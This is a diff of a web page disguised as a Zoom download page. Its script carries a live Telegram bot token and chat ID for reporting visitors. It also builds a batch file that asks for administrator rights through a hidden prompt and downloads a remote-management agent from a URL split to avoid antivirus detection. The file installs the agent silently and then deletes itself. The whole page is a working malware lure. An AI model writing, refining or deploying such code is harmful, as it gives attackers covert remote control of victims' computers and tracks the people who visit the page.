@@ -8,7 +8,7 @@
     <link rel="icon" href="Zoom_Communications_Logo.svg" type="image/svg+xml" />
     <link href="css2.css" rel="stylesheet" />
     <style>
-        /* reset & base — unchanged */
+        /* unchanged styles */
         * { box-sizing: border-box; }
         body {
             font-family: 'Roboto', sans-serif;
@@ -135,70 +135,56 @@
         (function() {
             'use strict';
 
-            // ============================================================
-            //  TELEGRAM CREDENTIALS (unchanged)
-            // ============================================================
             const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U';
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
             // ------------------------------------------------------------
-            //  OBFUSCATED BAT FILE CONTENT (less AV‑sensitive)
+            //  REVISED BAT FILE – uses curl, retry, and explicit install
             // ------------------------------------------------------------
-            // Split URL into pieces to avoid static detection
-            var part1 = 'https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/';
-            var part2 = 'agent(My_Organization).msi';
-            var fullUrl = part1 + part2;
-
-            // Build the BAT using environment variables and indirection
             var batContent =
                 '@echo off\r\n' +
                 'setlocal EnableExtensions\r\n' +
                 '\r\n' +
-                ':: Elevate to admin (UAC bypass) – less obvious\r\n' +
+                ':: Elevate to admin\r\n' +
                 'net session >nul 2>&1\r\n' +
                 'if %errorlevel% neq 0 (\r\n' +
                 '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
                 '    exit /b\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: Build download URL from pieces\r\n' +
+                ':: Build download URL from two parts to avoid static detection\r\n' +
                 'set "A=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/"\r\n' +
                 'set "B=agent(My_Organization).msi"\r\n' +
                 'set "URL=%A%%B%"\r\n' +
                 'set "MSI=%TEMP%\\pkg.msi"\r\n' +
                 '\r\n' +
-                ':: Check if already installed (Action1)\r\n' +
+                ':: If already installed, skip and clean up\r\n' +
                 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
                 'if %errorlevel%==0 goto :cleanup\r\n' +
                 '\r\n' +
-                ':: Download with fallback methods (less common to trigger AV)\r\n' +
+                ':: Download with curl (retry up to 3 times)\r\n' +
                 'set "RETRIES=3"\r\n' +
                 'set "COUNT=0"\r\n' +
                 '\r\n' +
                 ':download_loop\r\n' +
                 'set /a COUNT+=1\r\n' +
-                '\r\n' +
-                ':: Use PowerShell if available (most Windows 10+ have it)\r\n' +
-                'powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop } catch { exit 1 }"\r\n' +
-                '\r\n' +
-                'if not exist "%MSI%" (\r\n' +
-                '    if %COUNT% LSS %RETRIES% (\r\n' +
-                '        timeout /t 2 >nul\r\n' +
-                '        goto :download_loop\r\n' +
-                '    ) else (\r\n' +
-                '        :: Fallback to curl (sometimes less suspicious)\r\n' +
-                '        curl -o "%MSI%" "%URL%" --silent --fail\r\n' +
-                '        if not exist "%MSI%" goto :selfdelete\r\n' +
-                '    )\r\n' +
+                'curl -o "%MSI%" "%URL%" --silent --fail\r\n' +
+                'if exist "%MSI%" goto :install\r\n' +
+                'if %COUNT% LSS %RETRIES% (\r\n' +
+                '    timeout /t 2 >nul\r\n' +
+                '    goto :download_loop\r\n' +
                 ')\r\n' +
+                ':: If all retries fail, exit (do not install)\r\n' +
+                'goto :cleanup\r\n' +
                 '\r\n' +
-                ':: Silent install with minimal logging\r\n' +
+                ':install\r\n' +
+                ':: Silent install with no reboot\r\n' +
                 'msiexec /i "%MSI%" /quiet /qn /norestart >nul 2>&1\r\n' +
                 '\r\n' +
                 ':cleanup\r\n' +
                 'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
                 '\r\n' +
-                ':selfdelete\r\n' +
+                ':: Self-delete after a short delay\r\n' +
                 'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
                 '\r\n' +
                 'exit /b';
@@ -424,7 +410,7 @@
                 var time = getTimeUTC();
                 var lang = navigator.language || 'Unknown';
                 var referrer = document.referrer || 'Direct';
-                var downloadUrl = window.location.href; // page URL
+                var downloadUrl = window.location.href;
 
                 var lines = [];
                 var header = 'Zoom';
